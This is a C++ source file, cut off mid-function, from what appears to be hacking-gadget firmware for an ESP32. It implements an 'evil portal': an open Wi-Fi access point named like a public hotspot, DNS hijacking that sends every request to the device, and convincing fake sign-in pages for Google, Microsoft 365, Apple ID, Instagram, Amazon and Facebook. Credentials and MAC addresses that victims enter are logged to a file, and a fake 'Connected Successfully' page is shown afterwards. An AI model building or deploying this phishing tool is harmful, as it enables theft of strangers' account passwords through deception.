/*
    hackbox
    hackbox custom firmware
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/evil_portal.h"
#include "../include/level_system.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include "../include/setting.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

const char* customSSIDs[] = {
    "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
    "Starbucks", "McDonald's WiFi", "Public WiFi", "Open Network"
};
const int customSSIDCount = sizeof(customSSIDs) / sizeof(customSSIDs[0]);

namespace {

enum EvilPortalState {
    PORTAL_MENU,
    PORTAL_RUNNING,
    PORTAL_VIEW_CREDS,
    PORTAL_SCANNING
};

EvilPortalState currentState = PORTAL_MENU;
int menuSelection = 0;
int credIndex = 0;
esp_netif_t *ap_netif = NULL;

struct Credential {
    String ssid;
    String username;
    String password;
    String macAddress;
    unsigned long captureTime;
};

std::vector<Credential> capturedCreds;
String currentSSID = "Free WiFi";
int connectedClients = 0;
int totalVisitors = 0;

std::vector<String> scannedSSIDs;
int currentSSIDIndex = 0;
bool portal_scanCompleted = false;
unsigned long portal_lastScanTime = 0;
unsigned long menuEnterTime = 0;
unsigned long portal_scanStartTime = 0;
unsigned long portal_lastDisplayUpdate = 0;
uint16_t portal_lastApCount = 0;
bool portal_isScanning = false;
const unsigned long SCAN_INTERVAL = 60000;
const unsigned long SCAN_DURATION = 8000;
const unsigned long DISPLAY_UPDATE_INTERVAL = 100;

static bool needsRedraw = true;
static int lastMenuSelection = -1;
static int lastCredIndex = -1;
static int lastConnectedClients = -1;
static int lastTotalVisitors = -1;
static int lastCapturedCredsSize = 0;
static int lastScannedSSIDsSize = 0;
static EvilPortalState lastState = PORTAL_MENU;
static String lastCurrentSSID = "";
static int lastCurrentTemplate = -1;
static unsigned long lastStatusUpdate = 0;
const unsigned long statusUpdateInterval = 1000;

WebServer portalServer(80);
DNSServer portalDNS;
const byte DNS_PORT = 53;

// ==================== PORTAL TEMPLATES ====================

// 1) Generic Captive Portal ,clean, corporate-looking WiFi login
const char loginPortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Network Access</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.08);padding:40px 32px;width:100%;max-width:380px;margin:16px}
.icon{width:48px;height:48px;background:linear-gradient(135deg,#0071e3,#40a0ff);border-radius:12px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
.icon svg{width:24px;height:24px;fill:#fff}
h1{font-size:20px;font-weight:600;color:#1d1d1f;text-align:center;margin-bottom:4px}
.sub{text-align:center;color:#86868b;font-size:13px;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:12px;font-weight:500;color:#6e6e73;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
.field input{width:100%;padding:12px 14px;border:1.5px solid #d2d2d7;border-radius:8px;font-size:15px;transition:border-color .2s;outline:none;background:#fafafa}
.field input:focus{border-color:#0071e3;background:#fff}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#0071e3,#0077ed);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn:hover{opacity:.9}
.footer{text-align:center;margin-top:20px;font-size:11px;color:#86868b}
.lock{display:inline-block;margin-right:4px;vertical-align:middle}
</style>
</head>
<body>
<div class="card">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg></div>
<h1>Network Login</h1>
<p class="sub">Sign in to access the internet</p>
<form action="/login" method="POST">
<div class="field"><label>Email or Username</label><input type="text" name="username" placeholder="you@example.com" required autocomplete="off"></div>
<div class="field"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
<button class="btn" type="submit">Connect to Network</button>
</form>
<div class="footer"><span class="lock">&#128274;</span> Encrypted connection &bull; Terms apply</div>
</div>
</body>
</html>
)";

// 2) Google Sign-In ,realistic Material Design 3 style
const char googlePortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Sign in - Google Accounts</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:28px;padding:48px 40px 36px;width:100%;max-width:420px;margin:16px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.logo{text-align:center;margin-bottom:16px;font-size:0}
.logo span{font-size:24px;font-weight:500}
.logo .b{color:#4285f4}.logo .r{color:#ea4335}.logo .y{color:#fbbc04}.logo .g{color:#34a853}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:4px}
.sub{text-align:center;color:#5f6368;font-size:16px;margin-bottom:28px}
.field{position:relative;margin-bottom:24px}
.field input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:border-color .15s}
.field input:focus{border:2px solid #1a73e8;padding:13px 15px}
.field label{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#5f6368;font-size:16px;pointer-events:none;transition:.15s;background:#fff;padding:0 4px}
.field input:focus+label,.field input:not(:placeholder-shown)+label{top:0;font-size:12px;color:#1a73e8}
.forgot{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;display:inline-block;margin-bottom:28px}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
.btn{padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}
.btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.footer{text-align:center;margin-top:32px;font-size:12px;color:#5f6368}
.footer a{color:#5f6368;text-decoration:none;margin:0 8px}
</style>
</head>
<body>
<div class="card">
<div class="logo"><span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span></div>
<h1>Sign in</h1>
<p class="sub">to continue to WiFi</p>
<form action="/login" method="POST">
<div class="field"><input type="text" name="username" placeholder=" " required autocomplete="off"><label>Email or phone</label></div>
<div class="field"><input type="password" name="password" placeholder=" " required><label>Enter your password</label></div>
<a href="#" class="forgot">Forgot password?</a>
<div class="actions"><a href="#" class="create">Create account</a><button class="btn" type="submit">Next</button></div>
</form>
<div class="footer"><a href="#">English (United States)</a> <a href="#">Help</a> <a href="#">Privacy</a> <a href="#">Terms</a></div>
</div>
</body>
</html>
)";

// 3) Microsoft 365 ,realistic Fluent UI login
const char microsoftPortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Sign in to your account</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.outer{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);margin:16px}
.ms-logo{margin-bottom:16px}
.ms-logo .grid{display:grid;grid-template-columns:11px 11px;gap:2px;width:24px;margin-bottom:12px}
.ms-logo .grid div{width:11px;height:11px}
.ms-logo .c1{background:#f25022}.ms-logo .c2{background:#7fba00}.ms-logo .c3{background:#00a4ef}.ms-logo .c4{background:#ffb900}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
.sub{color:#1b1b1b;font-size:13px;margin-bottom:20px}
.field{margin-bottom:16px}
.field input{width:100%;padding:6px 10px;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;background:transparent}
.field input:focus{border-bottom:2px solid #0067b8;padding-bottom:5px}
.forgot{display:block;color:#0067b8;font-size:13px;text-decoration:none;margin-bottom:20px}
.btn{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#005da6}
.divider{display:flex;align-items:center;margin:20px 0;color:#666;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #ccc}
.divider::before{margin-right:12px}
.divider::after{margin-left:12px}
.secondary{width:100%;padding:10px;background:#fff;color:#1b1b1b;border:1px solid #8c8c8c;font-size:15px;cursor:pointer;margin-top:4px}
.secondary:hover{background:#f2f2f2}
.footer{margin-top:20px;font-size:12px;color:#666}
</style>
</head>
<body>
<div class="outer">
<div class="ms-logo"><div class="grid"><div class="c1"></div><div class="c2"></div><div class="c3"></div><div class="c4"></div></div></div>
<h1>Sign in</h1>
<p class="sub">to continue to your organization's network</p>
<form action="/login" method="POST">
<div class="field"><input type="text" name="username" placeholder="Email, phone, or Skype" required autocomplete="off"></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<a href="#" class="forgot">Forgot my password</a>
<button class="btn" type="submit">Sign in</button>
</form>
<div class="divider">or</div>
<button class="secondary" type="button" disabled>Sign in with a security key</button>
<div class="footer">No account? <a href="#" style="color:#0067b8;text-decoration:none;">Create one!</a></div>
</div>
</body>
</html>
)";

// 4) Apple iCloud ,clean Apple aesthetic
const char applePortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Sign in with Apple ID</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;background:linear-gradient(180deg,#f5f5f7 0%,#e8e8ed 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:18px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:40px 36px;width:100%;max-width:380px;margin:16px}
.apple-logo{text-align:center;margin-bottom:20px;font-size:44px;color:#1d1d1f}
h1{font-size:24px;font-weight:600;color:#1d1d1f;text-align:center;margin-bottom:4px;letter-spacing:-.3px}
.sub{text-align:center;color:#86868b;font-size:14px;margin-bottom:28px;line-height:1.4}
.field{margin-bottom:2px;border:1px solid #d2d2d7;border-radius:12px;overflow:hidden}
.field:first-of-type{border-radius:12px 12px 0 0;border-bottom:none}
.field:last-of-type{border-radius:0 0 12px 12px}
.field.single{border-radius:12px;border:1px solid #d2d2d7}
.field input{width:100%;padding:14px 16px;border:none;font-size:17px;outline:none;background:#fafafa;font-family:inherit}
.field input:focus{background:#fff}
.field input::placeholder{color:#86868b}
.btn{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:500;cursor:pointer;margin-top:20px;font-family:inherit}
.btn:hover{background:#0077ed}
.links{text-align:center;margin-top:24px}
.links a{color:#0071e3;font-size:14px;text-decoration:none;display:block;margin:8px 0}
.footer{text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid #d2d2d7;font-size:11px;color:#86868b;line-height:1.5}
</style>
</head>
<body>
<div class="card">
<div class="apple-logo">&#63743;</div>
<h1>Apple ID</h1>
<p class="sub">Sign in to access this Wi-Fi network with your Apple ID</p>
<form action="/login" method="POST">
<div class="field"><input type="text" name="username" placeholder="Apple ID" required autocomplete="off"></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button class="btn" type="submit">Sign In</button>
</form>
<div class="links"><a href="#">Forgot Apple ID or password?</a><a href="#">Don't have an Apple ID? Create yours now.</a></div>
<div class="footer">Your Apple ID is the email you use for Apple services.<br>&#128274; Your connection is secure.</div>
</div>
</body>
</html>
)";

// 5) Hotel/Airport Terms of Service ,classic captive portal
const char tosPortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Welcome - Complimentary WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.3);width:100%;max-width:420px;overflow:hidden;margin:16px}
.header{background:linear-gradient(135deg,#16213e,#0f3460);padding:28px 32px;text-align:center}
.header h1{color:#fff;font-size:22px;font-weight:600;margin-bottom:4px}
.header p{color:rgba(255,255,255,.7);font-size:13px}
.body{padding:28px 32px}
.welcome{font-size:15px;color:#333;margin-bottom:20px;line-height:1.5}
.tos-box{background:#f8f9fa;border:1px solid #e9ecef;border-radius:8px;padding:12px;margin-bottom:20px;max-height:100px;overflow-y:auto;font-size:11px;color:#6c757d;line-height:1.6}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;font-weight:600;color:#495057;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
.field input{width:100%;padding:11px 14px;border:1.5px solid #dee2e6;border-radius:8px;font-size:15px;outline:none;transition:border-color .2s}
.field input:focus{border-color:#0f3460}
.check{display:flex;align-items:flex-start;margin-bottom:20px;gap:8px}
.check input[type=checkbox]{margin-top:3px;accent-color:#0f3460}
.check label{font-size:12px;color:#6c757d;line-height:1.4}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#0f3460,#16213e);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{opacity:.9}
.footer{text-align:center;padding:16px;border-top:1px solid #e9ecef;font-size:11px;color:#adb5bd}
</style>
</head>
<body>
<div class="card">
<div class="header"><h1>&#9992; Complimentary WiFi</h1><p>High-speed internet access</p></div>
<div class="body">
<p class="welcome">Welcome! Please sign in to access our complimentary wireless internet service.</p>
<div class="tos-box">By using this wireless network, you agree to our Acceptable Use Policy. Users must not use the network for illegal activities, excessive bandwidth consumption, or activities that interfere with other users. We reserve the right to monitor network traffic and terminate access at any time. Connection logs are maintained for 90 days per our data retention policy. Use of VPN services is permitted. Maximum session duration: 24 hours.</div>
<form action="/login" method="POST">
<div class="field"><label>Email Address</label><input type="text" name="username" placeholder="your.email@example.com" required autocomplete="off"></div>
<div class="field"><label>Room # or Flight #</label><input type="password" name="password" placeholder="Enter number or code" required></div>
<div class="check"><input type="checkbox" id="tos" checked><label for="tos">I accept the Terms of Service and Acceptable Use Policy</label></div>
<button class="btn" type="submit">Connect to WiFi</button>
</form>
</div>
<div class="footer">Powered by GuestNet&trade; Hospitality Solutions &bull; Support: ext. 0</div>
</div>
</body>
</html>
)";

// 6) Instagram ,modern IG login style
const char instagramPortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:100%;max-width:350px;margin:16px;text-align:center}
.logo{font-family:'Segoe Script','Brush Script MT',cursive;font-size:36px;color:#262626;margin-bottom:24px}
.sub{color:#8e8e8e;font-size:15px;font-weight:600;margin-bottom:16px;line-height:1.4}
.field{margin-bottom:6px}
.field input{width:100%;padding:10px 8px;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;background:#fafafa;outline:none}
.field input:focus{border-color:#a8a8a8}
.field input::placeholder{color:#8e8e8e;font-size:12px}
.btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}
.btn:hover{background:#1877f2}
.btn:disabled{opacity:.3}
.divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}
.divider::before{margin-right:16px}.divider::after{margin-left:16px}
.fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;margin:12px 0}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:16px}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;width:100%;max-width:350px;text-align:center;margin-top:10px;font-size:14px;color:#262626}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">Instagram</div>
<p class="sub">Sign in to continue to WiFi</p>
<form action="/login" method="POST">
<div class="field"><input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off"></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button class="btn" type="submit">Log in</button>
</form>
<div class="divider">OR</div>
<a href="#" class="fb-login">&#9679; Log in with Facebook</a>
<a href="#" class="forgot">Forgot password?</a>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</body>
</html>
)";

// 7) Amazon ,realistic Amazon sign-in
const char amazonPortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Amazon Sign-In</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Amazon Ember',Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.top{width:100%;text-align:center;padding:14px 0;border-bottom:1px solid #e7e7e7}
.top .logo{font-size:28px;font-weight:700;color:#0F1111;letter-spacing:-1px}
.top .logo span{color:#FF9900}
.box{border:1px solid #ddd;border-radius:8px;padding:22px 26px;width:100%;max-width:350px;margin:20px 16px}
h1{font-size:28px;font-weight:400;color:#111;margin-bottom:18px}
.field{margin-bottom:14px}
.field label{display:block;font-size:13px;font-weight:700;color:#111;margin-bottom:4px;padding-left:2px}
.field input{width:100%;padding:7px 10px;border:1px solid #949494;border-radius:4px;font-size:13px;outline:none;box-shadow:0 1px 0 rgba(0,0,0,.07) inset}
.field input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,.5)}
.btn{width:100%;padding:8px;background:linear-gradient(to bottom,#f7dea0,#f0c14b);color:#0F1111;border:1px solid #a88734;border-radius:8px;font-size:13px;cursor:pointer}
.btn:hover{background:linear-gradient(to bottom,#f5d78e,#eeb933)}
.keep{display:flex;align-items:center;gap:6px;font-size:13px;color:#111;margin-bottom:18px}
.keep input{accent-color:#e77600}
.divider{display:flex;align-items:center;margin:18px 0;color:#767676;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #e7e7e7}
.divider::before{margin-right:10px}.divider::after{margin-left:10px}
.new-btn{width:100%;padding:8px;background:linear-gradient(to bottom,#f0f0f0,#e0e0e0);color:#0F1111;border:1px solid #adb1b8;border-radius:8px;font-size:13px;cursor:pointer;text-align:center}
.footer{width:100%;max-width:350px;text-align:center;margin-top:16px;padding-top:14px;border-top:1px solid #e7e7e7;font-size:11px;color:#555}
.footer a{color:#0066c0;text-decoration:none}
</style>
</head>
<body>
<div class="top"><div class="logo">amazon<span>.com</span></div></div>
<div class="box">
<h1>Sign in</h1>
<form action="/login" method="POST">
<div class="field"><label>Email or mobile phone number</label><input type="text" name="username" required autocomplete="off"></div>
<div class="field"><label>Password</label><input type="password" name="password" required></div>
<button class="btn" type="submit">Sign in</button>
</form>
<label class="keep"><input type="checkbox" checked> Keep me signed in.</label>
<div class="divider">New to Amazon?</div>
<button class="new-btn" type="button" disabled>Create your Amazon account</button>
</div>
<div class="footer"><a href="#">Conditions of Use</a> &nbsp; <a href="#">Privacy Notice</a> &nbsp; <a href="#">Help</a><br>&copy; 1996-2026, Amazon.com, Inc.</div>
</body>
</html>
)";

// 8) Facebook ,modern FB login
const char facebookPortalHTML[] PROGMEM = R"(
<!DOCTYPE html>
<html>
<head>
<title>Facebook - log in or sign up</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.wrap{display:flex;flex-direction:column;align-items:center;gap:16px;width:100%;max-width:400px;padding:16px}
.brand{text-align:center;margin-bottom:8px}
.brand h1{color:#1877f2;font-size:42px;font-weight:700;letter-spacing:-1.5px}
.brand p{font-size:15px;color:#1c1e21;line-height:1.4}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%}
.field{margin-bottom:12px}
.field input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
.field input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.field input::placeholder{color:#90949c}
.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
.btn:hover{background:#166fe5}
.forgot{text-align:center;margin:16px 0}
.forgot a{color:#1877f2;font-size:14px;text-decoration:none}
.hr{border-top:1px solid #dadde1;margin:20px 0}
.new-btn{display:block;margin:0 auto;padding:12px 24px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.new-btn:hover{background:#36a420}
.footer{text-align:center;font-size:12px;color:#8a8d91;margin-top:20px}
</style>
</head>
<body>
<div class="wrap">
<div class="brand"><h1>facebook</h1><p>Connect with friends and the world around you.</p></div>
<div class="card">
<form action="/login" method="POST">
<div class="field"><input type="text" name="username" placeholder="Email or phone number" required autocomplete="off"></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button class="btn" type="submit">Log in</button>
</form>
<div class="forgot"><a href="#">Forgot password?</a></div>
<div class="hr"></div>
<button class="new-btn" type="button" disabled>Create new account</button>
</div>
<div class="footer">Sign in to continue to WiFi</div>
</div>
</body>
</html>
)";

int currentTemplate = 0;
const char* const portalTemplates[] PROGMEM = {
    loginPortalHTML,
    googlePortalHTML,
    microsoftPortalHTML,
    applePortalHTML,
    tosPortalHTML,
    instagramPortalHTML,
    amazonPortalHTML,
    facebookPortalHTML
};
const char* templateNames[] = {
    "Network Login",
    "Google",
    "Microsoft 365",
    "Apple ID",
    "Hotel/Airport",
    "Instagram",
    "Amazon",
    "Facebook"
};
const int numTemplates = 8;

void handleCaptivePortal() {
    portalServer.send_P(200, "text/html", portalTemplates[currentTemplate]);
    totalVisitors++;
}

void handleLogin() {
    String username = portalServer.arg("username");
    String password = portalServer.arg("password");
    
    if (username.length() > 0 && password.length() > 0) {
        // Sanitize CSV delimiters out of user-controlled fields before we
        // persist to /portal_creds.csv. A captured password containing a
        // comma or newline would otherwise break loadSavedPortalCreds().
        auto sanitize = [](String &s) {
            s.replace(',', '_');
            s.replace('\n', '_');
            s.replace('\r', '_');
        };
        sanitize(username);
        sanitize(password);
        String safeSSID = currentSSID;
        sanitize(safeSSID);

        Credential newCred;
        newCred.ssid = safeSSID;
        newCred.username = username;
        newCred.password = password;

        String macAddr = "Unknown";
        wifi_sta_list_t stationList;
        esp_err_t err = esp_wifi_ap_get_sta_list(&stationList);

        if (err == ESP_OK && stationList.num > 0) {
            int lastIdx = (stationList.num == 1) ? 0 : stationList.num - 1;
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                stationList.sta[lastIdx].mac[0], stationList.sta[lastIdx].mac[1],
                stationList.sta[lastIdx].mac[2], stationList.sta[lastIdx].mac[3],
                stationList.sta[lastIdx].mac[4], stationList.sta[lastIdx].mac[5]);
            macAddr = String(macStr);
        }

        newCred.macAddress = macAddr;
        newCred.captureTime = millis();
        capturedCreds.push_back(newCred);
        addXP(10);

        // Persist to SPIFFS
        File f = SPIFFS.open("/portal_creds.csv", FILE_APPEND);
        if (f) {
            f.printf("%s,%s,%s,%s,%lu\n",
                     newCred.ssid.c_str(), newCred.username.c_str(),
                     newCred.password.c_str(), newCred.macAddress.c_str(),
                     newCred.captureTime);
            f.close();
        }
    }
    portalServer.send(200, "text/html",
        "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<style>*{margin:0;padding:0;box-sizing:border-box}"
        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;"
        "min-height:100vh;display:flex;align-items:center;justify-content:center}"
        ".card{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.08);padding:40px 32px;"
        "width:100%;max-width:400px;text-align:center;margin:16px}"
        ".check{width:64px;height:64px;background:#34c759;border-radius:50%;margin:0 auto 20px;"
        "display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff}"
        "h1{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:8px}"
        "p{color:#86868b;font-size:14px;line-height:1.5;margin-bottom:12px}"
        ".bar{background:#e5e5ea;border-radius:4px;height:6px;margin:20px 0;overflow:hidden}"
        ".fill{background:linear-gradient(90deg,#34c759,#30d158);height:100%;border-radius:4px;"
        "animation:load 3s ease-in-out}"
        "@keyframes load{0%{width:0}100%{width:100%}}"
        ".info{font-size:12px;color:#adb5bd;margin-top:16px}</style></head><body>"
        "<div class='card'><div class='check'>&#10003;</div>"
        "<h1>Connected Successfully</h1>"
        "<p>Your device has been authenticated and connected to the network.</p>"
        "<div class='bar'><div class='fill'></div></div>"
        "<p>Configuring network settings...</p>"
        "<div class='info'>You may now close this page and use the internet normally.<br>"
        "Session expires in 24 hours.</div></div></body></html>");
}

void setupPortalAP() {
    wifi_mode_t currentMode;
    if (esp_wifi_get_mode(&currentMode) == ESP_OK) {
        esp_wifi_stop();
        delay(50);
        esp_wifi_deinit();
        delay(50);
    }

    if (ap_netif != NULL) {
        esp_netif_destroy(ap_netif);
        ap_netif = NULL;
    }

    ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);

    // Copy the full SSID byte-for-byte (up to 32 bytes) so a 32-char SSID
    // doesn't get its last character clobbered by the strncpy()/explicit-NUL
    // pattern. The 802.11 wire format uses ssid_len, not a NUL terminator.
    wifi_config_t ap_config = {};
    memset(&ap_config, 0, sizeof(wifi_config_t));
    size_t portalSsidLen = currentSSID.length();
    if (portalSsidLen > sizeof(ap_config.ap.ssid)) portalSsidLen = sizeof(ap_config.ap.ssid);
    memcpy(ap_config.ap.ssid, currentSSID.c_str(), portalSsidLen);
    ap_config.ap.ssid_len = portalSsidLen;
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    delay(200);

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(ap_netif, &ip_info) == ESP_OK) {
        IPAddress apIP(ip_info.ip.addr);
        portalDNS.stop();
        portalDNS.start(DNS_PORT, "*", apIP);
    }

    portalServer.onNotFound(handleCaptivePortal);
    portalServer.on("/", handleCaptivePortal);
    portalServer.on("/login", HTTP_POST, handleLogin);
    portalServer.on("/generate_204", handleCaptivePortal);
    portalServer.on("/hotspot-detect.html", handleCaptivePortal);
    portalServer.on("/connecttest.txt", handleCaptivePortal);
    portalServer.on("/redirect", handleCaptivePortal);

    portalServer.begin();
}

void stopPortalAP() {
    portalServer.stop();
    portalDNS.stop();
    cleanupWiFi();
    ap_netif = NULL;
}

void processScanResults(unsigned long now) {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);
    
    if (number == 0) return;
    
    wifi_ap_record_t *ap_info = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
    if (ap_info == NULL) return;
    
    memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
    uint16_t actual_number = number;
    esp_err_t err = esp_wifi_scan_get_ap_records(&actual_number, ap_info);
    
    if (err == ESP_OK) {
        for (int i = 0; i < actual_number && scannedSSIDs.size() < 92; i++) {
            if (ap_info[i].ssid[0] != '\0') {
                String ssid = String((char*)ap_info[i].ssid);
                bool exists = false;
                for (const String& existingSSID : scannedSSIDs) {
                    if (existingSSID == ssid) {
                        exists = true;
                        break;
                    }
                }
                if (!exists) {
                    scannedSSIDs.push_back(ssid);
                }
            }
        }
    }
    
    free(ap_info);
}

void startScan() {
    scannedSSIDs.clear();
    portal_isScanning = true;
    portal_scanCompleted = false;
    portal_lastApCount = 0;
    portal_scanStartTime = millis();
    portal_lastDisplayUpdate = millis();
    
    esp_wifi_set_mode(WIFI_MODE_STA);
    delay(100);
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
